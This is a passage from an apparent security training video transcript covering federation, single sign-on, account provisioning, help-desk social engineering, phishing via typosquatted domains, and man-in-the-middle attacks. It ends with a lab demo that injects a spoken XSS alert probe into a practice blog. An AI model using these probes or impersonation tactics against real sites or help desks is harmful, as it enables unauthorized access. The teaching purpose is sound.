what, we kinda do some\nthings that would benefit each other.\n\n222\n00:09:52.910 --> 00:09:55.610\nWe should team up, right?\n\n223\n00:09:55.610 --> 00:09:58.300\nBut Mike's organization,\n\n224\n00:09:58.300 --> 00:10:03.790\nI can't use D Lowry at company A and\nlog into Mike at company B right?\n\n225\n00:10:03.790 --> 00:10:07.190\n&gt;&gt; My resources on my\nnetwork are not gonna trust\n\n226\n00:10:07.190 --> 00:10:10.450\nyour user accounts because I'm\nnot authenticating them, you are.\n\n227\n00:10:10.450 --> 00:10:12.270\n&gt;&gt; Exactly, so there's the problem.\n\n228\n00:10:12.270 --> 00:10:13.440\nSo what do we do?\n\n229\n00:10:13.440 --> 00:10:15.450\nWell that's where\nfederated services come in.\n\n230\n00:10:15.450 --> 00:10:20.750\nBasically you build a trust relationship\nbetween Mike's organization and\n\n231\n00:10:20.750 --> 00:10:21.890\nmy organization.\n\n232\n00:10:21.890 --> 00:10:22.810\nWhich will allow.\n\n233\n00:10:22.810 --> 00:10:28.020\nWhat it does is, it trusts the user\nthat is attempting contact\n\n234\n00:10:28.020 --> 00:10:33.290\nMike's organization that has that domain\nhas done its proper authentication.\n\n235\n00:10:33.290 --> 00:10:37.232\nIt's trusting Mike's or\nmine to do that and vice versa.\n\n236\n00:10:37.232 --> 00:10:38.650\nThat's federated service.\n\n237\n00:10:38.650 --> 00:10:42.839\nSo now I have the idea of a single sign\non even though I'm accessing Mike's\n\n238\n00:10:42.839 --> 00:10:45.609\nresources, I'm still\nonly signing on with my,\n\n239\n00:10:45.609 --> 00:10:48.669\nI have to get another log in\nto get access to his stuff.\n\n240\n00:10:48.669 --> 00:10:50.753\nWe've built that trust\nin federated services.\n\n241\n00:10:50.753 --> 00:10:54.984\nBut there are a few issues that we got\nto look through when it comes to this.\n\n242\n00:10:54.984 --> 00:10:59.704\nSingle sign on can definitely be a\ndangerous thing because I'm using one ring\n\n243\n00:10:59.704 --> 00:11:01.313\nto rule them all, right?\n\n244\n00:11:01.313 --> 00:11:02.698\nAnd the darkness behind them.\n\n245\n00:11:02.698 --> 00:11:06.270\n&gt;&gt; [LAUGH]\n&gt;&gt; To get all Tolkien on us here,\n\n246\n00:11:06.270 --> 00:11:10.540\nbut if you are able to steal\nmy credentials in any way,\n\n247\n00:11:10.540 --> 00:11:15.750\nnow I not only have access to\ncompany A but company B as well.\n\n248\n00:11:15.750 --> 00:11:17.940\nIt's keys to the kingdom.\n\n249\n00:11:17.940 --> 00:11:20.650\nSo that's one of the inherent dangers\nof working with single sign on.\n\n250\n00:11:20.650 --> 00:11:24.120\n&gt;&gt; Yeah, I think we've talked about\nthis before, in how convenience and\n\n251\n00:11:24.120 --> 00:11:28.920\nease of use and security,\nare at opposite points on that triangle.\n\n252\n00:11:28.920 --> 00:11:30.460\n&gt;&gt; Yep.\n&gt;&gt; And convenience, hey,\n\n253\n00:11:30.460 --> 00:11:34.030\nI can sign in with my work account and\naccess resources in other domains,\n\n254\n00:11:34.030 --> 00:11:35.560\nbecause we've set up a federation.\n\n255\n00:11:35.560 --> 00:11:37.000\nThat's very convenient.\n\n256\n00:11:37.000 --> 00:11:38.880\nBut we've moved away from security.\n\n257\n00:11:38.880 --> 00:11:41.100\nBecause now, yeah,\nif somebody gets into my account,\n\n258\n00:11:41.100 --> 00:11:43.400\nthey have access to everything\nthat I had access to.\n\n259\n00:11:43.400 --> 00:11:44.880\n&gt;&gt; Exactly.\n\n260\n00:11:44.880 --> 00:11:48.400\nAnother thing they call out on the exam is\nmanual versus automatic provisioning and\n\n261\n00:11:48.400 --> 00:11:49.600\ndeprovisioning.\n\n262\n00:11:49.600 --> 00:11:53.479\nYou know, the pros and\ncons to the size of those coins.\n\n263\n00:11:54.630 --> 00:11:57.030\nTypically I'm a manual kind of guy,\n\n264\n00:11:57.030 --> 00:12:01.165\nespecially when it comes to user\naccount creation and managements,\n\n265\n00:12:01.165 --> 00:12:05.180\nbecause that's one of the places I\njust don't like to let the control go.\n\n266\n00:12:06.450 --> 00:12:11.380\nIt's too easy to manipulate a system,\ntypically for user account creation.\n\n267\n00:12:11.380 --> 00:12:14.510\nI don't want superfluous\naccounts being in my system,\n\n268\n00:12:14.510 --> 00:12:16.340\nthere are companies that do that.\n\n269\n00:12:16.340 --> 00:12:17.890\nThink of your Gmail, right?\n\n270\n00:12:17.890 --> 00:12:21.691\nGoogle doesn't care that you created an\naccount that's not technically you, right?\n\n271\n00:12:21.691 --> 00:12:24.584\n&gt;&gt; Or that you create a third,\nor fourth, or a fifth one.\n\n272\n00:12:24.584 --> 00:12:27.460\n&gt;&gt; Right.\nExactly, and then they give you\n\n273\n00:12:27.460 --> 00:12:33.340\nthe ability to change your own password,\nself service resets of passwords.\n\n274\n00:12:33.340 --> 00:12:34.480\nDo I want that?\n\n275\n00:12:34.480 --> 00:12:36.010\nThey have their pros and cons right?\n\n276\n00:12:36.010 --> 00:12:39.491\nSo, if we're creating and\nsetting passwords, should that be done by\n\n277\n00:12:39.491 --> 00:12:42.918\nan administrator or should they be\nable to do it themselves, right?\n\n278\n00:12:42.918 --> 00:12:44.552\nAre they able to follow\na set of guidelines and\n\n279\n00:12:44.552 --> 00:12:47.098\nrules when it comes to these strong\nusernames and passwords, right?\n\n280\n00:12:47.098 --> 00:12:50.130\nThat's really where you\nstart looking at this.\n\n281\n00:12:50.130 --> 00:12:52.550\nAnother reason I'm more for,\n\n282\n00:12:52.550 --> 00:12:56.580\nespecially inside of organizations\nthat are more company oriented.\n\n283\n00:12:56.580 --> 00:12:57.240\n&gt;&gt; That's my thing.\n\n284\n00:12:57.240 --> 00:13:02.040\nIf you're a Hotmail or a Gmail and you're\ncreating hundreds or thousands of accounts\n\n285\n00:13:02.040 --> 00:13:05.890\na day and they don't really get access\nto anything other than their own little\n\n286\n00:13:05.890 --> 00:13:09.520\nslice of mailbox that you've given them,\nmaybe we can do automated.\n\n287\n00:13:09.520 --> 00:13:13.320\nBut if it's a corporate account that\nhas access to your corporate resources?\n\n288\n00:13:13.320 --> 00:13:17.100\nI mean, honestly, I have never worked\nin any large Fortune 500 companies.\n\n289\n00:13:17.100 --> 00:13:18.730\n&gt;&gt; Yeah.\n&gt;&gt; But I can't imagine creating\n\n290\n00:13:18.730 --> 00:13:20.380\nhundreds of accounts every day.\n\n291\n00:13:20.380 --> 00:13:22.720\nYou just don't have that much turnover.\n\n292\n00:13:22.720 --> 00:13:23.550\nAnd it seems like-\n&gt;&gt; You don't.\n\n293\n00:13:23.550 --> 00:13:27.310\n&gt;&gt; You'd want a little more control over\nthat process of creating accounts and\n\n294\n00:13:27.310 --> 00:13:28.640\ngiving it access.\n\n295\n00:13:28.640 --> 00:13:30.845\nAnd removing those accounts when\nthey don't need the access anymore.\n\n296\n00:13:30.845 --> 00:13:35.290\n&gt;&gt; Yeah, I worked at a company\nthat had a few thousand users and\n\n297\n00:13:35.290 --> 00:13:37.880\nyou probably did three or\nfour new users a month.\n\n298\n00:13:37.880 --> 00:13:41.140\nBoth new creations and\nthen deletions as well.\n\n299\n00:13:41.140 --> 00:13:44.510\nI mean this covers\nthe life cycle of stuff.\n\n300\n00:13:44.510 --> 00:13:47.590\nAnd then the provisioning\nthe account also, right?\n\n301\n00:13:47.590 --> 00:13:49.600\nSetting it up for,\nwhat does it have access to?\n\n302\n00:13:49.600 --> 00:13:51.130\nWhat does it have rights to?\n\n303\n00:13:51.130 --> 00:13:54.200\nWhat's its role inside of the company?\n\n304\n00:13:54.200 --> 00:13:58.150\nAll that stuff needs to be handled by\nsomeone who's manually looking at this.\n\n305\n00:13:58.150 --> 00:14:01.540\nAutomation can be helpful\non making that easier, but\n\n306\n00:14:01.540 --> 00:14:06.330\nagain, unless you've got a ton of churn\n\n307\n00:14:06.330 --> 00:14:09.970\nthat's happening I can't really see-\n&gt;&gt; One more time.\n\n308\n00:14:09.970 --> 00:14:10.510\n&gt;&gt; Yeah, yeah.\n\n309\n00:14:10.510 --> 00:14:13.660\n&gt;&gt; Ease of use, security,\nopposite ends, right?\n\n310\n00:14:13.660 --> 00:14:14.540\n&gt;&gt; Yeah, yeah.\n&gt;&gt; I mean, you know.\n\n311\n00:14:14.540 --> 00:14:15.212\nIt's one of those things.\n\n312\n00:14:15.212 --> 00:14:17.094\n&gt;&gt; Yeah.\n&gt;&gt; And granted, there's a place for it,\n\n313\n00:14:17.094 --> 00:14:18.990\nI'm sure, in several organizations.\n\n314\n00:14:18.990 --> 00:14:20.459\n&gt;&gt; True.\nUse this process and automate it.\n\n315\n00:14:20.459 --> 00:14:22.835\nAnd there's nothing wrong with that\nif it works for your organization.\n\n316\n00:14:22.835 --> 00:14:24.564\n&gt;&gt; Right.\n&gt;&gt; But you definitely want to think about\n\n317\n00:14:24.564 --> 00:14:27.390\nwhy you're doing it, if there's\na reason to automate that process.\n\n318\n00:14:27.390 --> 00:14:29.950\n&gt;&gt; And I would say if you\nare automating that process,\n\n319\n00:14:29.950 --> 00:14:32.060\nmake sure that you're also\nauditing that process.\n\n320\n00:14:32.060 --> 00:14:34.780\nMaybe you're not actually\ndoing the creation.\n\n321\n00:14:34.780 --> 00:14:37.740\nAutomation is taking care\nof that through a script or\n\n322\n00:14:37.740 --> 00:14:41.211\nwhatever the case is,\nbut you are auditing and\n\n323\n00:14:41.211 --> 00:14:43.850\nmaking sure that everything looks right,\nit's doing the exact thing.\n\n324\n00:14:43.850 --> 00:14:47.639\nBecause if you're not verifying that\nthings are doing what they're supposed to\n\n325\n00:14:47.639 --> 00:14:51.482\nbe doing, at least from time to time,\nwe talked about this in previous episodes,\n\n326\n00:14:51.482 --> 00:14:55.260\ncuz it's important, than you're\nsetting yourself up for a fall, right?\n\n327\n00:14:55.260 --> 00:14:56.400\nJust keep that in mind.\n\n328\n00:14:56.400 --> 00:15:01.880\nMaintenance of accounts can be difficult\nagain, automation, do we do that or not.\n\n329\n00:15:03.440 --> 00:15:05.880\nYeah, just making necessary\nmodifications as needed.\n\n330\n00:15:05.880 --> 00:15:08.535\nThat's hard to automate,\nto be honest with you.\n\n331\n00:15:08.535 --> 00:15:10.330\n&gt;&gt; Mm-hm.\n&gt;&gt; That's just things that you're gonna\n\n332\n00:15:10.330 --> 00:15:13.940\nhave to do as an administrator, but\nyou need to be doing them securely.\n\n333\n00:15:13.940 --> 00:15:18.330\nYou need to be knowing what your\nsecurity policies are and procedures.\n\n334\n00:15:18.330 --> 00:15:20.640\nThe guidelines and\nrules that you're following,\n\n335\n00:15:20.640 --> 00:15:22.830\nto make sure this is\ndone in a secure manner.\n\n336\n00:15:22.830 --> 00:15:27.790\nSo that you don't get overreaching\nrights and privileges to your users.\n\n337\n00:15:27.790 --> 00:15:32.130\nAnd then what does it look like when\nyou disable or delete an accounts?\n\n338\n00:15:32.130 --> 00:15:35.480\nAnd what's the process for that,\nis that all is again, is automated or\n\n339\n00:15:35.480 --> 00:15:37.170\nis it something that you can do manually?\n\n340\n00:15:37.170 --> 00:15:39.830\nTypically you see this is\nalmost probably always,\n\n341\n00:15:41.350 --> 00:15:44.060\na manual thing where\nsomebody gets involved.\n\n342\n00:15:44.060 --> 00:15:44.910\nWe've had a termination,\n\n343\n00:15:44.910 --> 00:15:50.688\nwe need to disable that account now\nbecause Bob was threatening his manager.\n\n344\n00:15:50.688 --> 00:15:54.910\nOkay well we don't want Bob to be\ncoming inside [INAUDIBLE] information.\n\n345\n00:15:54.910 --> 00:15:57.093\nWe don't want to give him\nany kinda leverage, right?\n\n346\n00:15:57.093 --> 00:15:59.553\nSo we disable the account.\n\n347\n00:15:59.553 --> 00:16:01.904\nNow do we immediately delete the account?\n\n348\n00:16:01.904 --> 00:16:03.042\nProbably not.\n\n349\n00:16:03.042 --> 00:16:05.623\nWe need to be able to go\nthrough Bob's account,\n\n350\n00:16:05.623 --> 00:16:09.095\nmake sure we get any good\ninformation off of that.\n\n351\n00:16:09.095 --> 00:16:12.920\nRe-delegate rights and\nprivileges to other users, so\n\n352\n00:16:12.920 --> 00:16:16.940\nif he was doing a specific job, I get\nother people to take over everything, and\n\n353\n00:16:16.940 --> 00:16:18.570\naccess to files that he had.\n\n354\n00:16:18.570 --> 00:16:21.420\nRemember to transfer\nownership of that stuff, so\n\n355\n00:16:21.420 --> 00:16:25.570\nit'd be hard to automate that stuff,\nbecause it can be so esoteric.\n\n356\n00:16:25.570 --> 00:16:29.680\nAll right, now let's talk about\nsocial engineering of the creation.\n\n357\n00:16:29.680 --> 00:16:34.265\nThis is all like impersonation stuff,\nit can be, at least lead to that.\n\n358\n00:16:34.265 --> 00:16:37.231\nIf I am able to phone up Mike and\n\n359\n00:16:37.231 --> 00:16:42.096\nsay, hey yeah,\nI know that Bill works in HR, and\n\n360\n00:16:42.096 --> 00:16:46.990\nI do a good job of\nimpersonating Bill in some way.\n\n361\n00:16:46.990 --> 00:16:50.952\nAnd I can say, hey we need a new, or send\na really well-crafted email to Mike, or\n\n362\n00:16:50.952 --> 00:16:54.625\nas an administrator and say, we need\na new user we just hired so-and-so,\n\n363\n00:16:54.625 --> 00:16:56.870\ncan you please create\nthem into the account.\n\n364\n00:16:56.870 --> 00:17:00.900\nI've gone through all the proper channels,\nI've gained access to that in some way,\n\n365\n00:17:00.900 --> 00:17:04.770\nand now Mike, who has the keys to create,\nis now doing that.\n\n366\n00:17:04.770 --> 00:17:09.067\nSo we have to have controls in case that\nwill help to mitigate that hopefully.\n\n367\n00:17:09.067 --> 00:17:10.237\nBut it can be really,\n\n368\n00:17:10.237 --> 00:17:14.269\nif they've gotten that far you're\nprobably pretty in in trouble right?\n\n369\n00:17:14.269 --> 00:17:17.273\n&gt;&gt; [LAUGH]\n&gt;&gt; But knowing the proper channels, and\n\n370\n00:17:17.273 --> 00:17:20.770\nanything seeming strange is gonna be\nsomething you're gonna look out for.\n\n371\n00:17:22.290 --> 00:17:24.430\nLet's see here, also, deleting account.\n\n372\n00:17:24.430 --> 00:17:26.750\nMaybe I want Mike to\ndelete a specific account.\n\n373\n00:17:26.750 --> 00:17:29.850\nBut I just want him to get me a way, so\n\n374\n00:17:29.850 --> 00:17:34.570\nwhere I have access into\nthe system that I shouldn't have.\n\n375\n00:17:34.570 --> 00:17:35.907\n&gt;&gt; And I think we talked\nabout that the other day.\n\n376\n00:17:35.907 --> 00:17:37.982\nAn example of that,\na healthcare company in south Florida,\n\n377\n00:17:37.982 --> 00:17:39.960\nthey got popped with those HIPAA fines.\n\n378\n00:17:39.960 --> 00:17:43.244\nBecause, and I don't know if they\nhad an automated system or not, but\n\n379\n00:17:43.244 --> 00:17:46.099\nfailed to remove accounts after\nthey were no longer needed.\n\n380\n00:17:46.099 --> 00:17:50.884\nEmployees were fired or left the company,\naccounts were still there, still active,\n\n381\n00:17:50.884 --> 00:17:53.045\nand still had access to resources, and\n\n382\n00:17:53.045 --> 00:17:56.010\nwere unfortunately being\nused to access resources.\n\n383\n00:17:56.010 --> 00:17:59.100\nAnd that was a bad day for\nthat company, very expensive mistake.\n\n384\n00:17:59.100 --> 00:18:02.760\n&gt;&gt; Yeah, I wouldn't wanna be that CSO,\nI'll tell you right now.\n\n385\n00:18:02.760 --> 00:18:04.540\nHe's printing his resume.\n\n386\n00:18:04.540 --> 00:18:05.400\n&gt;&gt; Yeah.\n&gt;&gt; I'm sure.\n\n387\n00:18:05.400 --> 00:18:08.940\nBecause these are the things\nthat do that for us, you know?\n\n388\n00:18:08.940 --> 00:18:10.440\nJust going all back to the,\n\n389\n00:18:10.440 --> 00:18:15.120\nI was thinking about this manipulating\ninto getting Mike to do something.\n\n390\n00:18:15.120 --> 00:18:17.920\nI used to see it all the time, to be\nhonest with you, I saw it all the time.\n\n391\n00:18:17.920 --> 00:18:23.060\nAnd not manipulation, but\nthe lack of security that would lead to\n\n392\n00:18:23.060 --> 00:18:26.700\nthis type of social\nengineering being effective.\n\n393\n00:18:27.800 --> 00:18:30.840\nPeople would call the help desk,\nI'm locked out of my account.\n\n394\n00:18:30.840 --> 00:18:34.660\nThey have a user name,\nit's typically easy to get user names.\n\n395\n00:18:34.660 --> 00:18:37.950\n&gt;&gt;

You call a help desk,\nI'm locked out of my account.\n\n399\n00:18:42.440 --> 00:18:43.490\n&gt;&gt; What's your user name?\n\n400\n00:18:43.490 --> 00:18:45.560\nYeah, I'm Rodrick.\n\n401\n00:18:45.560 --> 00:18:46.423\nOkay hold on for a second?\n\n402\n00:18:46.423 --> 00:18:47.167\n&gt;&gt;

Okay, thank you so much.\n\n409\n00:18:56.282 --> 00:18:56.800\nAnd now what?\n\n410\n00:18:56.800 --> 00:18:58.234\nI changed the password but\nI want it to be.\n\n411\n00:18:58.234 --> 00:19:01.134\nI did the damage I wanted to do, so\n\n412\n00:19:01.134 --> 00:19:05.540\nwe have to have verifications\nof these things.\n\n413\n00:19:05.540 --> 00:19:08.550\nOkay you are I say I'm M Rodrick,\n\n414\n00:19:08.550 --> 00:19:11.800\nMike asked me that question,\nand I say, yeah, I'm M Rodrick.\n\n415\n00:19:11.800 --> 00:19:14.160\nOkay, what's the answer to\nyour security question?\n\n416\n00:19:14.160 --> 00:19:15.540\nYou know?\nHere's your security question,\n\n417\n00:19:15.540 --> 00:19:18.130\nwhat's the answer to it?\n\n418\n00:19:18.130 --> 00:19:20.320\n&gt;&gt; Or here's a text to your phone,\n\n419\n00:19:20.320 --> 00:19:24.190\nsome kind of out-of-bands\nverification of that identity.\n\n420\n00:19:24.190 --> 00:19:27.505\n&gt;&gt; Exactly, and we've talked about\nthe importance of using multi-factor\n\n421\n00:19:27.505 --> 00:19:29.546\nauthentication, maybe you have to do both.\n\n422\n00:19:29.546 --> 00:19:32.427\nIt's not just a one and done kind\nof thing, you got two, or three, or\n\n423\n00:19:32.427 --> 00:19:33.150\nfour things.\n\n424\n00:19:33.150 --> 00:19:38.000\nHoops they've got to jump through,\nto verify who they are before we\n\n425\n00:19:38.000 --> 00:19:41.490\nstart account reset, and\ndoing things of that nature.\n\n426\n00:19:41.490 --> 00:19:45.740\nAnd then we talk about self-service\npassword resets, and the inherent danger\n\n427\n00:19:45.740 --> 00:19:49.900\nin that is that the questions can be,\nbecause that's typically what they'll use.\n\n428\n00:19:49.900 --> 00:19:52.700\nThey'll say, here's a set of\nsecurity questions, fill out two or\n\n429\n00:19:52.700 --> 00:19:53.520\nthree of them, maybe five.\n\n430\n00:19:53.520 --> 00:19:55.050\n&gt;&gt; What was the name of your first pet?\n\n431\n00:19:55.050 --> 00:19:59.750\n&gt;&gt; Right, how easy would that be\nto discover if I started socially\n\n432\n00:19:59.750 --> 00:20:01.520\nprofiling Mike?\n\n433\n00:20:01.520 --> 00:20:05.390\nI could find out what he likes and\nwhat he doesn't like, follow him around.\n\n434\n00:20:05.390 --> 00:20:09.230\nIf he's a high profile target and\nI'm really Interested in getting in or\n\n435\n00:20:09.230 --> 00:20:12.450\nhe’s super busy on Instagram or\nFacebook and Twitter,\n\n436\n00:20:12.450 --> 00:20:15.770\nand all that, I can learn a lot\nabout Mike through those means.\n\n437\n00:20:15.770 --> 00:20:19.000\n&gt;&gt; High school’s name,\nwhat was your mother’s maiden name.\n\n438\n00:20:19.000 --> 00:20:20.200\n&gt;&gt; Just public information.\n\n439\n00:20:20.200 --> 00:20:23.068\n&gt;&gt; This is information that\ncan be found out if wanted.\n\n440\n00:20:23.068 --> 00:20:26.143\n&gt;&gt; Yeah, they unfortunately,\ncan be too easily guessed and\n\n441\n00:20:26.143 --> 00:20:27.531\nthey can be compromised.\n\n442\n00:20:27.531 --> 00:20:31.311\n&gt;&gt; And they could also be used as a denial\nof service, because let's say, I can't get\n\n443\n00:20:31.311 --> 00:20:35.510\nthose questions right, what happens when\nyou answer those questions incorrectly?\n\n444\n00:20:35.510 --> 00:20:36.190\n&gt;&gt; You get locked out.\n\n445\n00:20:36.190 --> 00:20:36.890\n&gt;&gt; A locked account.\n\n446\n00:20:36.890 --> 00:20:40.410\nSo I might not get in as Daniel, but\nI can darn sure lock his account, right?\n\n447\n00:20:40.410 --> 00:20:43.390\nI can start locking corporate\naccounts on your webpage,\n\n448\n00:20:43.390 --> 00:20:45.230\nif you have this\nself-service reset option.\n\n449\n00:20:45.230 --> 00:20:47.130\n&gt;&gt; Exactly.\n&gt;&gt; Cuz again, I know the username,\n\n450\n00:20:47.130 --> 00:20:49.870\nI just type in the wrong password and\nboom, here come the questions.\n\n451\n00:20:49.870 --> 00:20:51.900\n&gt;&gt; Yeah, well,\nwe're running a little bit out of time.\n\n452\n00:20:51.900 --> 00:20:53.880\nI wanna finish this\nlittle section up here,\n\n453\n00:20:53.880 --> 00:20:55.460\nwe're gonna look at some cool stuff now.\n\n454\n00:20:55.460 --> 00:20:56.430\n&gt;&gt; All right.\n\n455\n00:20:56.430 --> 00:20:59.930\n&gt;&gt; Some of the typical attacks\nwhen it comes to identity.\n\n456\n00:20:59.930 --> 00:21:02.910\nOne is impersonation,\nwhich we've kinda discussed.\n\n457\n00:21:02.910 --> 00:21:06.240\nPretending to be a trusted identity\nin some way, shape or form.\n\n458\n00:21:06.240 --> 00:21:09.920\nAnd this is the overarching idea,\nand this can be done.\n\n459\n00:21:09.920 --> 00:21:14.320\nIn the real world, there's even social\nengineering, maybe a well crafted email.\n\n460\n00:21:16.440 --> 00:21:20.204\nPeople's eyes tend to see what\nthey think they should see.\n\n461\n00:21:20.204 --> 00:21:21.720\nWe typically don't read, we sight read.\n\n462\n00:21:21.720 --> 00:21:24.070\nIt's called sight reading,\nwhere we see a word, and\n\n463\n00:21:24.070 --> 00:21:28.900\nwe know what that word looks like, and\nso we assume that's spelled correctly.\n\n464\n00:21:28.900 --> 00:21:30.060\n&gt;&gt; And our brain fixes it for us.\n\n465\n00:21:30.060 --> 00:21:31.450\n&gt;&gt; Our brain fixes it for us.\n\n466\n00:21:31.450 --> 00:21:35.860\nSo if I send an email with a link\nthat they're used to seeing all day,\n\n467\n00:21:35.860 --> 00:21:38.050\nthat's realsecurity.com.\n\n468\n00:21:38.050 --> 00:21:41.230\nBut it's actually real S-E-C-U-I-R-T-Y.\n\n469\n00:21:41.230 --> 00:21:43.750\nIt's a different domain\nthat I've registered, and\n\n470\n00:21:43.750 --> 00:21:46.190\nit has my phishing page set up on it.\n\n471\n00:21:46.190 --> 00:21:49.430\nWith my credential harvesting\naction going on, we've seen that.\n\n472\n00:21:50.660 --> 00:21:51.400\nWhat happens?\n\n473\n00:21:51.400 --> 00:21:55.050\n&gt;&gt; Type in Google with three o's and\nsee what happens in your browser.\n\n474\n00:21:55.050 --> 00:21:58.230\nDaniel, it's funny cuz you've got these\nURLs listed out in your notes here.\n\n475\n00:21:58.230 --> 00:21:58.730\n&gt;&gt; Yeah.\n\n476\n00:21:58.730 --> 00:22:00.490\n&gt;&gt; And it took me a minute,\nI had to sit here and\n\n477\n00:22:00.490 --> 00:22:02.600\ngo why does he have the same URL twice?\n\n478\n00:22:02.600 --> 00:22:04.170\nWhat is the difference, where is it?\n\n479\n00:22:04.170 --> 00:22:07.660\nI don't, transpose those letters.\n\n480\n00:22:07.660 --> 00:22:10.124\nTook me a good 30 seconds\nof looking at it.\n\n481\n00:22:10.124 --> 00:22:13.290\n&gt;&gt; And Mike's a security professional,\nhe knows security very well.\n\n482\n00:22:13.290 --> 00:22:16.090\nAnd it's easy for\nus to just get in a hurry.\n\n483\n00:22:16.090 --> 00:22:19.200\nWe're reading emails, we're doing work and\nthings like that, we get distracted.\n\n484\n00:22:19.200 --> 00:22:21.890\nThis is why our security awareness\ntraining is an extremely important thing\n\n485\n00:22:21.890 --> 00:22:24.910\nthat we teach our users,\nMike knew something was up.\n\n486\n00:22:24.910 --> 00:22:26.830\nWhy would he have it twice?\n\n487\n00:22:26.830 --> 00:22:30.444\nYou know, and look for\nthose inconsistencies to check and\n\n488\n00:22:30.444 --> 00:22:34.222\nfind those social engineering attacks,\nthose platforms.\n\n489\n00:22:34.222 --> 00:22:38.048\nSo let's, there's also things I'll open,\nredirects I wanted to mention that,\n\n490\n00:22:38.048 --> 00:22:41.069\nit's just where a webpage will\nredirect you to another webpage.\n\n491\n00:22:41.069 --> 00:22:45.590\nAnd sometimes you're able to modify\nthat with inside the browser itself, and\n\n492\n00:22:45.590 --> 00:22:47.890\nyou redirect them to malicious sites.\n\n493\n00:22:47.890 --> 00:22:51.260\nSo open redirects can be\nvery dangerous as well.\n\n494\n00:22:51.260 --> 00:22:53.440\nMan in the middle attacks,\ntraditional man in the middle attacks,\n\n495\n00:22:53.440 --> 00:22:57.880\nsomething like ARP cache poisoning\nattack where I'm able to.\n\n496\n00:22:57.880 --> 00:23:01.130\nBasically, the idea is I'm\nsitting between the client and\n\n497\n00:23:01.130 --> 00:23:04.085\nserver, and\nI'm pretending to be one or the both.\n\n498\n00:23:04.085 --> 00:23:04.760\n&gt;&gt; Mm-hm.\n\n499\n00:23:04.760 --> 00:23:07.700\n&gt;&gt; I'm intercepting that traffic,\nmaybe just bringing it in or\n\n500\n00:23:07.700 --> 00:23:10.340\nmaybe even allowing it to pass through,\n\n501\n00:23:10.340 --> 00:23:13.740\nto let the end stations to be none\nthe wiser that the attack has occurred.\n\n502\n00:23:13.740 --> 00:23:16.330\nBut I'm intercepting their conversation,\n\n503\n00:23:16.330 --> 00:23:19.690\nanything that's in plain text I'll be\nable to intercept and look at easily.\n\n504\n00:23:19.690 --> 00:23:22.950\nAnything that's obfuscated,\nmaybe I'll be able to crack it if it's\n\n505\n00:23:22.950 --> 00:23:25.880\na weak encryption protocol,\nor something like that.\n\n506\n00:23:25.880 --> 00:23:28.100\nThe case is that,\nI'm sitting in the middle.\n\n507\n00:23:28.100 --> 00:23:29.070\nI'm getting that information,\n\n508\n00:23:29.070 --> 00:23:31.910\nand I'm privy to something\nthat I normally would not be.\n\n509\n00:23:31.910 --> 00:23:34.410\nNow, I'm not gonna jump and\npull up a bunch of routers and\n\n510\n00:23:34.410 --> 00:23:35.680\nthings like that to show you that.\n\n511\n00:23:35.680 --> 00:23:39.960\nBut I will show you some other\ntypes of man-in-the-middle attacks,\n\n512\n00:23:41.110 --> 00:23:44.090\nthat would be properly called it, but\nalso other things, like session hijacking.\n\n513\n00:23:44.090 --> 00:23:46.040\nSession hijacking would be\na man-in-the-middle attack.\n\n514\n00:23:46.040 --> 00:23:50.506\nIt's also an impersonation attack, or\ncan be, depending on how you do it.\n\n515\n00:23:50.506 --> 00:23:53.462\nSo, let's take a look at that,\n\n516\n00:23:53.462 --> 00:23:59.057\nI'm gonna do some cross site\nscripting to actually do this.\n\n517\n00:23:59.057 --> 00:24:01.189\nSo, here we are on this blog site,\n\n518\n00:24:01.189 --> 00:24:05.459\nI grabbed this from it's one\nof PentesterLab's Free ISOs,\n\n519\n00:24:05.459 --> 00:24:10.560\nIndustrial Lab is a great resource,\nuse that, B1hub's also a great resource.\n\n520\n00:24:10.560 --> 00:24:14.190\nYou can download this stuff build you\nup a cool little network of VM's, or\n\n521\n00:24:14.190 --> 00:24:17.510\nwhatever and start playing\nwith these types of exploits.\n\n522\n00:24:17.510 --> 00:24:19.660\nSo, we got a blog it says\nbe the first to comment, so\n\n523\n00:24:19.660 --> 00:24:21.450\nI click on there I wanna test it.\n\n524\n00:24:21.450 --> 00:24:22.970\nA cross site scripting.\n\n525\n00:24:22.970 --> 00:24:25.550\nI'm gonna say hacker's my title.\n\n526\n00:24:25.550 --> 00:24:28.420\nActually I like to do this because I\nnever know what's gonna show up on\n\n527\n00:24:28.420 --> 00:24:29.350\nthe other end.\n\n528\n00:24:29.350 --> 00:24:34.310\nSo I'll do like hacker_title\nlike I did before right?\n\n529\n00:24:34.310 --> 00:24:38.110\nThat way I know if it shows\nup it was in the title field.\n\n530\n00:24:38.110 --> 00:24:42.330\nAuthor hacker author I\ndid that before as well.\n\n531\n00:24:42.330 --> 00:24:44.590\nSo now I know it was in the author field.\n\n532\n00:24:44.590 --> 00:24:45.900\nAnd then the text.\n\n533\n00:24:45.900 --> 00:24:49.470\nWhat I'm doing is I'm just gonna\nput some HTML script in here and\n\n534\n00:24:49.470 --> 00:24:54.210\nsee if it executes that script\ninstead of just sees it as text.\n\n535\n00:24:54.210 --> 00:24:56.120\nDoes it interpret it and execute it?\n\n536\n00:24:56.120 --> 00:24:57.510\nOr does it see it as text?\n\n537\n00:24:57.510 --> 00:25:00.052\nSo an easy way to do\nthat is to do the alert.\n\n538\n00:25:00.052 --> 00:25:01.209\nSo you just say script.\n\n539\n00:25:01.209 --> 00:25:02.130\nOpen those tags.\n\n540\n00:25:02.130 --> 00:25:03.760\nSay alert.\n\n541\n00:25:03.760 --> 00:25:07.760\nOpen like that and\nI just do xss usually something like that.\n\n542\n00:25:08.800 --> 00:25:12.700\nClose it off and\nclose my script tag and there we go.\n\n543\n00:25:12.700 --> 00:25:15.150\nSo if this is vulnerable\n\n544\n00:25:15.150 --> 00:25:19.880\nI will get a pop up in the middle\nof my screen that says xss, right?\n\n545\n00:25:19.880 --> 00:25:24.200\nIt's not I'll just see my comment\nas being script alert xss,\n\n546\n00:25:24.200 --> 00:25:26.420\nclosed tag script, right?\n\n547\n00:25:26.420 --> 00:25:27.310\nSo now I can test for this.\n\n548\n00:25:27.310 --> 00:25:28.410\nI'll submit query.\n\n549\n00:25:28.410 --> 00:25:29.703\nAnd look at that,\n\n550\n00:25:29.703 --> 00:25:34.560\nwe do get xss and it is vulnerable\nto cross site scripting attacks.\n\n551\n00:25:34.560 --> 00:25:37.500\nOkay, now we can have a little bit of fun.\n\n552\n00:25:37.500 --> 00:25:38.960\n&gt;&gt; Right.\n&gt;&gt; So what we can do is.\n\n553\n00:25:38.960 --> 00:25:41.860\nI'm gonna go in here in my terminal here.\n\n554\n00:25:41.860 --> 00:25:44.910\nI keep some documents around\nto help me remember how to 